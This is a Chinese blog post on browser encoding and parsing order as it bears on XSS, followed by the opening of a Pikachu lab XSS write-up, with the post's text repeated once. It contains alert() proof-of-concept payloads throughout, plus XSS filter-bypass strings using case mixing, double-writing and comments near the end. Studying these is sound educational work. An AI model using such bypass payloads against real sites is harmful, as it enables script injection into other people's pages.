&lt;/script&gt;</code></strong>，<code>(</code>进行了Unicode编码，那么解码后它不再是作为控制字符，而是作为标识符的一部分<code>alert(</code>。</p>\n<p>因此函数的括号之类的控制字符进行Unicode转义后是不能被正常解码解释的。</p>\n</blockquote>\n<p>总结，Unicode序列只有出现在标识符中时，才能被正常的解码解释。</p>\n<p>例子，</p>\n<blockquote>\n<p><strong><code>&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0031\\u0029&lt;/script&gt;</code></strong></p>\n<p>被编码部分为<code>alert(11)</code>。</p>\n<p>该例子中的JS不会被执行，因为控制字符被编码了。</p>\n</blockquote>\n<blockquote>\n<p><strong><code>&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031\\u0032)&lt;/script&gt;</code></strong></p>\n<p>被编码部分为<code>alert</code>及括号内为<code>12</code>。</p>\n<p>该例子中JS不会被执行，原因在于括号内被编码的部分不能被正常解码解释，要么使用ASCII数字，要么加<code>&quot;&quot;</code>或<code>&#39;&#39;</code>使其变为字符串，作为字符串也只能作为普通字符。</p>\n</blockquote>\n<blockquote>\n<p><strong><code>&lt;script&gt;alert(&#39;13\\u0027)&lt;/script&gt;</code></strong></p>\n<p>被编码处为<code>&#39;</code>。</p>\n<p>该例的JS不会执行，因为控制字符被编码了，解码后的<code>&#39;</code>将变为字符串的一部分，而不再解释为控制字符。因此该例中字符串是不完整的，因为没有<code>&#39;</code>来结束字符串。</p>\n</blockquote>\n<blockquote>\n<p><strong><code>&lt;script&gt;alert(&#39;14\\u000a&#39;)&lt;/script&gt;</code></strong></p>\n<p>该例的JS会被执行，因为被编码的部分处于字符串内，只会被解释为普通字符，不会突破字符串上下文。</p>\n</blockquote>\n<h3 id=\"0x03-解析顺序\"><a href=\"#0x03-解析顺序\" class=\"headerlink\" title=\"0x03 解析顺序\"></a>0x03 解析顺序</h3><p>首先浏览器接收到一个HTML文档时，会触发HTML解析器对HTML文档进行词法解析，这一过程完成HTML解码并创建DOM树，接下来JavaScript解析器会介入对内联脚本进行解析，这一过程完成JS的解码工作，如果浏览器遇到需要URL的上下文环境，这时URL解析器也会介入完成URL的解码工作，URL解析器的解码顺序会根据URL所在位置不同，可能在JavaScript解析器之前或之后解析。HTML解析总是第一步。</p>\n<p>URL解析和JavaScript解析，它们的解析顺序要根据情况而定。</p>\n<p>例子，</p>\n<blockquote>\n<p><strong><code>&lt;a href=&quot;UserInput&quot;&gt;&lt;/a&gt;</code></strong></p>\n<p>该例子中，首先由HTML解析器对<code>UserInput</code>部分进行字符实体解码；</p>\n<p>接着URL解析器对<code>UserInput</code>进行URL decode；</p>\n<p>如果URL的Scheme部分为<code>javascript</code>的话，JavaScript解析器会再对<code>UserInput</code>进行解码。</p>\n<p>所以解析顺序是：HTML解析——&gt;URL解析——&gt;JavaScript解析。</p>\n</blockquote>\n<blockquote>\n<p><strong><code>&lt;a href=# onclick=&quot;window.open(&#39;UserInput&#39;)&quot;&gt;&lt;/a&gt;</code></strong></p>\n<p>该例子中，首先由HTML解析器对<code>UserInput</code>部分进行字符实体解码；</p>\n<p>接着由JavaScript解析器会再对<code>onclick</code>部分的JS进行解析并执行JS；</p>\n<p>执行JS后<code>window.open(&#39;UserInput&#39;)</code>函数的参数会传入URL，所以再由URL解析器对<code>UserInput</code>部分进行解码。</p>\n<p>因此解析顺序为：HTML解析——&gt;JavaScript解析——&gt;URL解析。</p>\n</blockquote>\n<blockquote>\n<p><strong><code>&lt;a href=&quot;javascript:window.open(&#39;UserInput&#39;)&quot;&gt;</code></strong></p>\n<p>该例子中，首先还是由HTML解析器对<code>UserInput</code>部分进行字符实体解码；</p>\n<p>接着由URL解析器解析<code>href</code>的属性值；</p>\n<p>然后由于Scheme为<code>javascript</code>，所以由JavaScript解析；</p>\n<p>解析执行JS后<code>window.open(&#39;UserInput&#39;)</code>函数传入URL，所以再由URL解析器解析。</p>\n<p>所以解析顺序为：HTML解析——&gt;URL解析——&gt;JavaScript解析——&gt;URL解析。</p>\n</blockquote>\n<p>综合实例：</p>\n<p><strong><code>&lt;a  href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;\n&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;\n&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;\n&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;\n&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;\n&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;\n&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;\n&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;\n&amp;#x35;&amp;#x29;&quot;&gt; &lt;/a&gt;</code></strong></p>\n<p>首先HTML解析器进行解析，解析到<code>href</code>属性的值时，状态机进入<strong><code>属性值状态（Attribute Value State）</code></strong>，该状态会解码字符实体，解码得到结果：</p>\n<p><img src=\"/2019/03/07/0x00-XSS学习系列之解析HTML文档/QQ截图20190308105040.png\" alt></p>\n<p>接着由URL解析器进行解析并解码：</p>\n<p><img src=\"/2019/03/07/0x00-XSS学习系列之解析HTML文档/QQ截图20190308105254.png\" alt></p>\n<p>再接着由于Scheme为javascript，因此由JavaScript解析器解析并解码，加上编码部分是函数名，属于标识符，因此可以正常解码解释：</p>\n<p><img src=\"/2019/03/07/0x00-XSS学习系列之解析HTML文档/QQ截图20190308105533.png\" alt></p>\n<p>经过三轮解析解码后得到结果：<code>&lt;a href=&quot;javascript:alert(15)&quot;&gt;&lt;/a&gt;</code></p>\n<p>参考连接：</p>\n<p><a href=\"https://www.attacker-domain.com/2013/04/deep-dive-into-browser-parsing-and-xss.html\" target=\"_blank\" rel=\"noopener\">https://www.attacker-domain.com/2013/04/deep-dive-into-browser-parsing-and-xss.html</a></p>\n<p><a href=\"https://security.yirendai.com/news/share/26\" target=\"_blank\" rel=\"noopener\">https://security.yirendai.com/news/share/26</a></p>\n<p><a href=\"https://xz.aliyun.com/t/1556\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/1556</a></p>\n<p><a href=\"https://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/%E8%A7%A3%E7%A0%81%E9%A1%BA%E5%BA%8F.md\" target=\"_blank\" rel=\"noopener\">https://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/%E8%A7%A3%E7%A0%81%E9%A1%BA%E5%BA%8F.md</a></p>\n","site":{"data":{}},"excerpt":"<h2 id=\"一、前端基本编码知识\"><a href=\"#一、前端基本编码知识\" class=\"headerlink\" title=\"一、前端基本编码知识\"></a>一、前端基本编码知识</h2><h3 id=\"0x00-为什么要进行编码\"><a href=\"#0x00-为什么要进行编码\" class=\"headerlink\" title=\"0x00 为什么要进行编码?\"></a>0x00 为什么要进行编码?</h3><blockquote>\n<p>主要是因为某些数据不适合传输。原因多种多样，如Size过大，包含隐私数据，另外重要的一点就是有些字符会<strong>引起歧义</strong>。</p>\n</blockquote>\n<p>对于URL，</p>\n<blockquote>\n<p><code>&amp;</code>用于分割多个参数，倘若有某个参数键值对为<code>name=v&amp;lue</code>，就会因为<code>name</code>参数的值<code>v&amp;lue</code>中携带了<code>&amp;</code>而造成歧义。因此需要对<code>&amp;</code>进行URL编码。</p>\n</blockquote>\n<p>对于HTML，</p>\n<blockquote>\n<p>当浏览器遇到<code>&lt;</code>会识别为元素定义的开始，<code>&gt;</code>会识别为元素的结束。倘若有<code>&lt;div  id=&quot;1&gt;&quot; &gt;&lt;/div&gt;</code>，由于标签的属性值携带了<code>&gt;</code>，同样会造成歧义。因此需要属性值的<code>&gt;</code>需要进行HTML编码，即使用字符实体。</p>\n</blockquote>","more":"<h3 id=\"0x01-URL编码\"><a href=\"#0x01-URL编码\" class=\"headerlink\" title=\"0x01 URL编码\"></a>0x01 URL编码</h3><blockquote>\n<p>RFC3986文档规定，Url中只允许包含英文字母（a-zA-Z）、数字（0-9）、-_.~4个特殊字符以及所有保留字符。</p>\n</blockquote>\n<p>编码方式，</p>\n<blockquote>\n<p><code>%</code>加<code>字符在ASCII码表中的十六进制值</code>。</p>\n<p>例如，<code>/</code>在ASCII码表中十六进制为<code>0x2f</code>，那么它对应的URL编码为<code>%2f</code>。</p>\n</blockquote>\n<p>JavaScript中提供了3个函数用来对Url编码以得到合法的Url：</p>\n<ul>\n<li>escape()</li>\n<li>encodeURI（）</li>\n<li>encodeURIComponent（）</li>\n</ul>\n<p>参考连接：<a href=\"https://www.cnblogs.com/jerrysion/p/5522673.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/jerrysion/p/5522673.html</a></p>\n<h3 id=\"0x02-HTML编码（字符实体）\"><a href=\"#0x02-HTML编码（字符实体）\" class=\"headerlink\" title=\"0x02 HTML编码（字符实体）\"></a>0x02 HTML编码（字符实体）</h3><p>字符实体是一个预先定义好的转义序列。</p>\n<p>字符实体两种表示方法:</p>\n<blockquote>\n<ul>\n<li>字符实体以<code>&amp;</code>开头+预先定义的<code>实体名称</code>+<code>;</code>分号结束，如“&lt;”的实体名称为<code>&amp;lt;</code></li>\n<li>字符实体还可以以<code>&amp;</code>开头+<code>#</code>符号+<code>字符在ASCII对应的十进制数字</code>+<code>;</code>分号结束，如<code>&lt;</code>的实体编号为<code>&amp;#60;</code>。</li>\n</ul>\n</blockquote>\n<p><strong>字符都是有实体编号的，但有些字符是没有实体名称的。</strong></p>\n<p><img src=\"/2019/03/07/0x00-XSS学习系列之解析HTML文档/QQ截图20190307120011.png\" alt></p>\n<h3 id=\"0x03-JavaScript编码\"><a href=\"#0x03-JavaScript编码\" class=\"headerlink\" title=\"0x03 JavaScript编码\"></a>0x03 JavaScript编码</h3><p>最常用的如<code>\\uXXXX</code>这种写法的Unicode转义序列，表示一个字符，其中<code>xxxx</code>表示一个16进制数字，如<code>&lt;</code>Unicode编码为<code>\\u003c</code>。</p>\n<h2 id=\"二、解析HTML文档\"><a href=\"#二、解析HTML文档\" class=\"headerlink\" title=\"二、解析HTML文档\"></a>二、解析HTML文档</h2><p>解析一个HTML文档涉及三个主要过程：HTML解析——&gt;URL解析——JavaScript解析。</p>\n<p>每一个过程由相应的解析器进行解码解析：HTML解析器、URL解析器、JavaScript解析器。</p>\n<h3 id=\"0x00-HTML解析器\"><a href=\"#0x00-HTML解析器\" class=\"headerlink\" title=\"0x00 HTML解析器\"></a>0x00 HTML解析器</h3><p>HTML解析器以状态机的方式运行，它从文档输入流中消耗字符并根据其转换规则转换到不同的状态。</p>\n<blockquote>\n<p>当HTML解析器遇到<code>&lt;</code>字符，且字符后不包含<code>/</code>,即不是闭合标签时，状态机就会进入<strong><code>标签打开状态（Tag Open State）</code></strong>，随后再进入<strong><code>标签名称状态（Tag Name State）</code></strong>、<strong><code>属性名称前状态（Before Attribute Name State）</code></strong>……最后进入<strong><code>数据状态（Data State）</code></strong>并且发布当前<strong><code>标签令牌（Token）</code></strong>。状态机处于<strong><code>数据状态（Data State）</code></strong>时，会继续上述的步骤，遇到完整的标签就发出<strong><code>标签令牌（Token）</code></strong>。</p>\n</blockquote>\n<p>HTML解析器处于<strong><code>数据状态（Data State）</code></strong>、<strong><code>RCDATA 状态（RCDATA State）</code></strong>、<strong><code>属性值状态（Attribute Value State）</code></strong>时，<strong>字符实体</strong>会被解码为对应的字符。</p>\n<p>例子，</p>\n<blockquote>\n<p><strong><code>&lt;div&gt;&amp;#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt;</code></strong></p>\n<p><code>&lt;</code>和<code>&gt;</code>被编码为字符实体<code>&amp;#60;</code>和<code>&amp;#62;</code>。</p>\n<p>当HTML解析器解析完<code>&lt;div&gt;</code>时，会进入<strong><code>数据状态（Data State）</code></strong>并发布标签令牌。接着解析到实体<code>&amp;#60;</code>时因为处在<strong><code>数据状态（Data State）</code></strong>就会对实体进行解码为<code>&lt;</code>，后面的<code>&amp;#62;</code>同样道理被解码为<code>&gt;</code>。</p>\n</blockquote>\n<p>这里会有个问题，被解码后，<code>img</code>是否会被解析为HTML标签而导致JS执行呢？</p>\n<blockquote>\n<p>答案是否定的。因为解析器在使用字符引用后不会转换到<strong><code>标签打开状态（Tag Open State）</code></strong>，不进入标签打开状态就不会被发布为HTML标签。因此，不会创建新HTML标签，只会将其作为数据来处理。</p>\n<p><strong>这也是为什么我们可以使用字符实体来避免用户不安全输入导致XSS的原因。</strong></p>\n</blockquote>\n<p><strong>RCDATA</strong></p>\n<p>在HTML中，属于<strong><code>RCDATA Elements</code></strong>的标签有两个：<code>textarea</code>、<code>title</code>。</p>\n<p><strong><code>RCDATA Elements</code></strong>类型的标签可以包含文本内容和字符实体。</p>\n<p>解析器解析到<code>textarea</code>、<code>title</code>标签的数据部分时，状态会进入<strong><code>RCDATA State</code></strong>。</p>\n<p>前面我们提到，处于<strong><code>RCDATA State</code></strong>状态时，字符实体是会被解析器解码的。</p>\n<p>例子， </p>\n<blockquote>\n<p><strong><code>&lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt;</code></strong></p>\n<p><code>&lt;</code>和<code>&gt;</code>被编码为实体<code>&amp;#60;</code>和<code>&amp;#62;</code>。</p>\n<p>解析器解析到它们时会进行解码，最终得到<strong><code>&lt;textarea&gt;&lt;script&gt;alert(5)&lt;/script&gt;&lt;/textarea&gt;</code></strong>。但是里面的JS同样还是不会被执行，原因还是因为解码字符实体状态机不会进入<strong><code>标签打开状态（Tag Open State）</code></strong>，因此里面的<code>&lt;script&gt;</code>并不会被解析为HTML标签。</p>\n</blockquote>\n<p>事实上，任何<code>RCDATA</code>（<code>textarea</code>、<code>title</code>里面的数据）都不会使得状态机进入<strong><code>标签打开状态（Tag Open State）</code></strong>，So if a user input wants to escape out of the CDATA context, it has to use the exact “]]&gt;” sequence without any encoding。</p>\n<p>HTML解析规范：<a href=\"https://html.spec.whatwg.org/multipage/parsing.html#tokenization\" target=\"_blank\" rel=\"noopener\">https://html.spec.whatwg.org/multipage/parsing.html#tokenization</a></p>\n<h3 id=\"0x01-URL解析器\"><a href=\"#0x01-URL解析器\" class=\"headerlink\" title=\"0x01 URL解析器\"></a>0x01 URL解析器</h3><p>URL解析器也被建模为状态机，文档输入流中的字符可以将其导向不同的状态。</p>\n<p>首先，要注意的是URL的<code>Scheme</code>部分（协议部分）必须为ASCII字符，即不能被任何编码，否则URL解析器的状态机将进入<strong><code>No Scheme</code></strong>状态。</p>\n<p>例如，</p>\n<blockquote>\n<p><strong><code>&lt;a href=&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;/a&gt;</code></strong></p>\n<p>URL编码部分的是<code>javascript:alert(1)</code>。</p>\n<p>JS不会被执行，因为作为<code>Scheme</code>部分的<code>&quot;javascript&quot;</code>这个字符串被编码，导致URL解析器状态机进入<strong><code>No Scheme</code></strong>状态。</p>\n</blockquote>\n<p>同样，URL中的<code>:</code>也不能被以任何方式编码，否则URL解析器的状态机也将进入<strong><code>No Scheme</code></strong>状态。</p>\n<p>例如，</p>\n<blockquote>\n<p><strong><code>&lt;a href=&quot;javascript%3aalert(3)&quot;&gt;&lt;/a&gt;</code></strong></p>\n<p>由于<code>:</code>被URL编码为<code>%3a</code>，导致URL状态机进入<strong><code>No Scheme</code></strong>状态，JS代码不能执行。</p>\n</blockquote>\n<p>另一个例子：</p>\n<p><strong><code>&lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;&gt;</code></strong></p>\n<p><code>&quot;javascript&quot;</code>这个字符串被实体化编码，<code>:</code>没有被编码,<code>alert(2)</code>被URL编码。</p>\n<p>例子中的JS被成功执行。那么将产生一个问题。为什么作为URL的<code>Scheme</code>部分的<code>&quot;javascript&quot;</code>这个字符串被编码了但JS还是被执行了？</p>\n<blockquote>\n<p>原因在于，首先，在HTML解析器中我们谈到过，HTML状态机处于<strong><code>属性值状态（Attribute Value State）</code></strong>时，字符实体时会被解码的，此处在<code>href</code>属性中，所以被实体化编码的<code>&quot;javascript&quot;</code>字符串会被解码。其次，HTML解析是在URL解析之前的，所以在进行URL解析之前，<code>Scheme</code>部分的<code>&quot;javascript&quot;</code>字符串已被解码，而并不再是被实体编码的状态。</p>\n</blockquote>\n<p>URL解析规范：<a href=\"https://url.spec.whatwg.org/\" target=\"_blank\" rel=\"noopener\">https://url.spec.whatwg.org/</a></p>\n<p>URL地址结构：<a href=\"https://blog.csdn.net/x_nirvana/article/details/50768906\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/x_nirvana/article/details/50768906</a></p>\n<h3 id=\"0x02-JavaScript解析器\"><a href=\"#0x02-JavaScript解析器\" class=\"headerlink\" title=\"0x02 JavaScript解析器\"></a>0x02 JavaScript解析器</h3><p>JavaScript解析与HTML解析的区别在于JavaScript是上下文自由的。</p>\n<p>在HTML中，属于<strong><code>Raw text elements</code></strong>的标签有两个：<code>script</code>、<code>style</code>。</p>\n<p>在<strong><code>Raw text elements</code></strong>类型标签下的所有内容块都属于该标签。</p>\n<p>存在一条特性：</p>\n<blockquote>\n<p>即<strong><code>Raw text elements</code></strong>类型标签下的所有字符实体编码都不会被HTML解码。HTML解析器解析到<code>script</code>、<code>style</code>标签的内容块（数据）部分时，状态会进入<strong><code>Script Data State</code></strong>，该状态并不在我们前面说的会解码字符实体的三条状态之中。</p>\n</blockquote>\n<p>因此，<strong><code>&lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59&lt;/script&gt;</code></strong>这样字符实体并不会被解码，也就不会执行JS。</p>\n<p>形如 <code>\\uXXXX</code>这样的Unicode字符转义序列或Hex编码是否能被解码需要看情况。</p>\n<p>首先，JavaScript中有三个地方可以出现Unicode字符转义序列：</p>\n<p>字符串中（in String）</p>\n<blockquote>\n<p><code>Unicode escape sequences will NEVER break out of the string context in JavaScript because they will always be interpreted as string literals.</code></p>\n<p>即，Unicode转义序列出现在字符串中时，它只会被解释为普通字符，而不会破坏字符串的上下文。例如<code>\\u000A</code>在Java字符串中会被解释为行终止符，会导致字符串上下文断裂。但在JavaScript中的字符串只会被解释为普通字符。简单说就是会被解码，但只解释为字符串的一部分。</p>\n</blockquote>\n<p>标识符中（in identifier names）</p>\n<blockquote>\n<p>若Unicode转义序列存在于标识符中，即变量名（如函数名等…），它会被进行解码。</p>\n<p>例如，<strong><code>&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(10);&lt;/script&gt;</code></strong></p>\n<p>被编码转义的部分为<code>alert</code>字符，是函数名，属于在标识符中的情况，因此会被正常解码，JS代码也会被执行。</p>\n</blockquote>\n<p>控制字符中（in control characters）</p>\n<blockquote>\n<p>若Unicode转义序列存在于控制字符中，那么它会被解码但不会被解释为控制字符，而会被解释为标识符或字符串字符的一部分。</p>\n<p>控制字符即<code>&#39;</code>、<code>&quot;</code>、<code>()</code>等。</p>\n<p>例如，<strong><code>&lt;script&gt; alert\\u0028&quot;xss&quot;); &lt;/script&gt;</code></strong>，<code>(</code>进行了Unicode编码，那么解码后它不再是作为控制字符，而是作为标识符的一部分<code>alert(</code>。</p>\n<p>因此函数的括号之类的控制字符进行Unicode转义后是不能被正常解码解释的。</p>\n</blockquote>\n<p>总结，Unicode序列只有出现在标识符中时，才能被正常的解码解释。</p>\n<p>例子，</p>\n<blockquote>\n<p><strong><code>&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0031\\u0029&lt;/script&gt;</code></strong></p>\n<p>被编码部分为<code>alert(11)</code>。</p>\n<p>该例子中的JS不会被执行，因为控制字符被编码了。</p>\n</blockquote>\n<blockquote>\n<p><strong><code>&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031\\u0032)&lt;/script&gt;</code></strong></p>\n<p>被编码部分为<code>alert</code>及括号内为<code>12</code>。</p>\n<p>该例子中JS不会被执行，原因在于括号内被编码的部分不能被正常解码解释，要么使用ASCII数字，要么加<code>&quot;&quot;</code>或<code>&#39;&#39;</code>使其变为字符串，作为字符串也只能作为普通字符。</p>\n</blockquote>\n<blockquote>\n<p><strong><code>&lt;script&gt;alert(&#39;13\\u0027)&lt;/script&gt;</code></strong></p>\n<p>被编码处为<code>&#39;</code>。</p>\n<p>该例的JS不会执行，因为控制字符被编码了，解码后的<code>&#39;</code>将变为字符串的一部分，而不再解释为控制字符。因此该例中字符串是不完整的，因为没有<code>&#39;</code>来结束字符串。</p>\n</blockquote>\n<blockquote>\n<p><strong><code>&lt;script&gt;alert(&#39;14\\u000a&#39;)&lt;/script&gt;</code></strong></p>\n<p>该例的JS会被执行，因为被编码的部分处于字符串内，只会被解释为普通字符，不会突破字符串上下文。</p>\n</blockquote>\n<h3 id=\"0x03-解析顺序\"><a href=\"#0x03-解析顺序\" class=\"headerlink\" title=\"0x03 解析顺序\"></a>0x03 解析顺序</h3><p>首先浏览器接收到一个HTML文档时，会触发HTML解析器对HTML文档进行词法解析，这一过程完成HTML解码并创建DOM树，接下来JavaScript解析器会介入对内联脚本进行解析，这一过程完成JS的解码工作，如果浏览器遇到需要URL的上下文环境，这时URL解析器也会介入完成URL的解码工作，URL解析器的解码顺序会根据URL所在位置不同，可能在JavaScript解析器之前或之后解析。HTML解析总是第一步。</p>\n<p>URL解析和JavaScript解析，它们的解析顺序要根据情况而定。</p>\n<p>例子，</p>\n<blockquote>\n<p><strong><code>&lt;a href=&quot;UserInput&quot;&gt;&lt;/a&gt;</code></strong></p>\n<p>该例子中，首先由HTML解析器对<code>UserInput</code>部分进行字符实体解码；</p>\n<p>接着URL解析器对<code>UserInput</code>进行URL decode；</p>\n<p>如果URL的Scheme部分为<code>javascript</code>的话，JavaScript解析器会再对<code>UserInput</code>进行解码。</p>\n<p>所以解析顺序是：HTML解析——&gt;URL解析——&gt;JavaScript解析。</p>\n</blockquote>\n<blockquote>\n<p><strong><code>&lt;a href=# onclick=&quot;window.open(&#39;UserInput&#39;)&quot;&gt;&lt;/a&gt;</code></strong></p>\n<p>该例子中，首先由HTML解析器对<code>UserInput</code>部分进行字符实体解码；</p>\n<p>接着由JavaScript解析器会再对<code>onclick</code>部分的JS进行解析并执行JS；</p>\n<p>执行JS后<code>window.open(&#39;UserInput&#39;)</code>函数的参数会传入URL，所以再由URL解析器对<code>UserInput</code>部分进行解码。</p>\n<p>因此解析顺序为：HTML解析——&gt;JavaScript解析——&gt;URL解析。</p>\n</blockquote>\n<blockquote>\n<p><strong><code>&lt;a href=&quot;javascript:window.open(&#39;UserInput&#39;)&quot;&gt;</code></strong></p>\n<p>该例子中，首先还是由HTML解析器对<code>UserInput</code>部分进行字符实体解码；</p>\n<p>接着由URL解析器解析<code>href</code>的属性值；</p>\n<p>然后由于Scheme为<code>javascript</code>，所以由JavaScript解析；</p>\n<p>解析执行JS后<code>window.open(&#39;UserInput&#39;)</code>函数传入URL，所以再由URL解析器解析。</p>\n<p>所以解析顺序为：HTML解析——&gt;URL解析——&gt;JavaScript解析——&gt;URL解析。</p>\n</blockquote>\n<p>综合实例：</p>\n<p><strong><code>&lt;a  href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;\n&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;\n&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;\n&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;\n&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;\n&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;\n&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;\n&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;\n&amp;#x35;&amp;#x29;&quot;&gt; &lt;/a&gt;</code></strong></p>\n<p>首先HTML解析器进行解析，解析到<code>href</code>属性的值时，状态机进入<strong><code>属性值状态（Attribute Value State）</code></strong>，该状态会解码字符实体，解码得到结果：</p>\n<p><img src=\"/2019/03/07/0x00-XSS学习系列之解析HTML文档/QQ截图20190308105040.png\" alt></p>\n<p>接着由URL解析器进行解析并解码：</p>\n<p><img src=\"/2019/03/07/0x00-XSS学习系列之解析HTML文档/QQ截图20190308105254.png\" alt></p>\n<p>再接着由于Scheme为javascript，因此由JavaScript解析器解析并解码，加上编码部分是函数名，属于标识符，因此可以正常解码解释：</p>\n<p><img src=\"/2019/03/07/0x00-XSS学习系列之解析HTML文档/QQ截图20190308105533.png\" alt></p>\n<p>经过三轮解析解码后得到结果：<code>&lt;a href=&quot;javascript:alert(15)&quot;&gt;&lt;/a&gt;</code></p>\n<p>参考连接：</p>\n<p><a href=\"https://www.attacker-domain.com/2013/04/deep-dive-into-browser-parsing-and-xss.html\" target=\"_blank\" rel=\"noopener\">https://www.attacker-domain.com/2013/04/deep-dive-into-browser-parsing-and-xss.html</a></p>\n<p><a href=\"https://security.yirendai.com/news/share/26\" target=\"_blank\" rel=\"noopener\">https://security.yirendai.com/news/share/26</a></p>\n<p><a href=\"https://xz.aliyun.com/t/1556\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/1556</a></p>\n<p><a href=\"https://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/%E8%A7%A3%E7%A0%81%E9%A1%BA%E5%BA%8F.md\" target=\"_blank\" rel=\"noopener\">https://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/%E8%A7%A3%E7%A0%81%E9%A1%BA%E5%BA%8F.md</a></p>"},{"title":"WEB漏洞靶场Pikachu Writeup Chapter 2：XSS","date":"2019-03-21T01:10:05.000Z","_content":"\n### 一、前面的话\n\n#### 0x00 XSS可以分为如下几种常见类型\n\n> - 反射性XSS\n> - 存储型XSS\n> - DOM型XSS\n\n#### 0x01 XSS漏洞的防范\n\n> 一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理。\n\n- 输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;\n- 输出转义：根据输出点的位置对输出到前端的内容进行适当转义;\n\n<!-- more -->\n\n#### 0x02 XSS过滤的简单绕过\n\n> - 前端过滤绕过，抓包拦截改包即可。\n> - 大小写绕过：`<SciPt>alert(1)</sCIpt>`（JavaScript大小写敏感，但HTML大小写不敏感）\n> - 双写绕过：`<scr<script>ipt>alert(1)</scr</script>ipt>`\n> - 注释干扰：`<scri<!-- comment-->pt>alert(1)</sc<!-- comment -->ript>`\n> - 编码绕过：注意前端编码解码机制。\n\n不同类型的XSS利用方式都差不多，目标是让其执行JS代码，因此在下面的例子中每个点只用一种漏洞利用方式。\n\n### 二、XSS\n\n#### 0x00 